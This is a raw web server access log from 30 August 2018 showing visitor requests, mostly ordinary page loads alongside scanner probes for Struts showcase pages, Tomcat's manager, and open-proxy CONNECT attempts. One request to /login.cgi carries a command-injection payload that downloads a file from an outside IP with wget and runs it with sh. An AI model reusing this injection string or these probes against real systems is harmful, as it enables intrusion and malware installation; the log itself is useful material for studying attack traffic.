216.218.206.69 - - [30/Aug/2018:00:17:19 +0000] "GET / HTTP/1.1" 200 10329
177.8.164.84 - - [30/Aug/2018:00:36:03 +0000] "GET /struts2-showcase/showcase.action HTTP/1.1" 404 10329
177.8.164.84 - - [30/Aug/2018:00:36:04 +0000] "GET /actionchaining/actionChain1.action HTTP/1.1" 404 10329
177.8.164.84 - - [30/Aug/2018:00:36:04 +0000] "GET /struts3-showcase/showcase.action HTTP/1.1" 404 10329
177.8.164.84 - - [30/Aug/2018:00:36:08 +0000] "GET /showcase.action HTTP/1.1" 404 10329
103.70.146.125 - - [30/Aug/2018:01:13:25 +0000] "GET / HTTP/1.1" 200 10329
1.52.143.238 - - [30/Aug/2018:06:46:42 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://148.72.176.78/ngynx%20-O%20-%3E%20/tmp/ngynx;sh%20/tmp/ngynx%27$ HTTP/1.1" 400 -
180.92.238.244 - - [30/Aug/2018:06:56:43 +0000] "GET / HTTP/1.1" 200 10329
183.47.227.165 - - [30/Aug/2018:07:16:01 +0000] "GET /systemInfo HTTP/1.1" 404 10329
78.188.234.9 - - [30/Aug/2018:07:22:13 +0000] "GET / HTTP/1.1" 200 10329
109.195.196.15 - - [30/Aug/2018:07:35:04 +0000] "GET / HTTP/1.1" 200 10329
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "CONNECT hideface.mooo.com:80 HTTP/1.1" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "CONNECT webcam02.dynv6.net:80 HTTP/1.1" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "CONNECT hideface.mooo.com:80 HTTP/1.1" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "GET /myiphb.php?rnd=967659a7cf329bb419bf52075b1b1743&rn=743541428 HTTP/1.1" 404 10329
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "GET /myiphd.php?rnd=967659a7cf329bb419bf52075b1b1743&rn=857513791 HTTP/1.1" 404 10329
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "GET /myiphb.php?rnd=967659a7cf329bb419bf52075b1b1743&rn=38617473 HTTP/1.1" 404 10329
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:52 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
95.153.104.223 - - [30/Aug/2018:08:19:53 +0000] "-" 400 -
217.197.180.97 - - [30/Aug/2018:09:40:57 +0000] "GET / HTTP/1.1" 200 10329
116.212.155.67 - - [30/Aug/2018:10:06:00 +0000] "GET / HTTP/1.1" 200 10329
186.78.106.255 - - [30/Aug/2018:10:45:48 +0000] "GET / HTTP/1.1" 200 10329
123.249.42.97 - - [30/Aug/2018:11:03:28 +0000] "GET /manager/html HTTP/1.1" 404 10329
